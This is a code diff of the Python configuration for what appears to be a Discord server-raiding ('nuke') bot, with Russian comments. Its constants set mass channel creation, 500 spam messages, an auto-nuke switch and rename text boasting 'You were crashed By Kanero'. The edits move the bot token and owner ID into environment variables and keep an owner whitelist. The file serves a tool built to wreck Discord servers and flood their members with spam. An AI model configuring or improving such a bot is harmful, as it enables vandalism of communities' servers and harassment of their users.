@@ -1,4 +1,6 @@
 import os
+
+# Токен читается из переменной окружения (безопасно для GitHub)
 TOKEN = os.environ.get("DISCORD_TOKEN", "")
 CHANNELS_COUNT = 30
 SPAM_COUNT = 500
@@ -9,9 +11,11 @@ RENAME_TEXT = "Вы были крашнуты By Kanero"
 NICK = "Вы были крашнуты By Kanero"
 AUTO_NUKE = False
 
+# Owner ID — читается из переменной окружения или используется значение по умолчанию
+OWNER_ID = int(os.environ.get("OWNER_ID", "1421778029310509056"))
+
 # Whitelist — сюда добавляй Discord ID пользователей
 WHITELIST = [1421778029310509056]
-OWNER_ID = 1421778029310509056
 
 # Owner whitelist — управляется только овнером через ЛС
 OWNER_WHITELIST = [1421778029310509056]
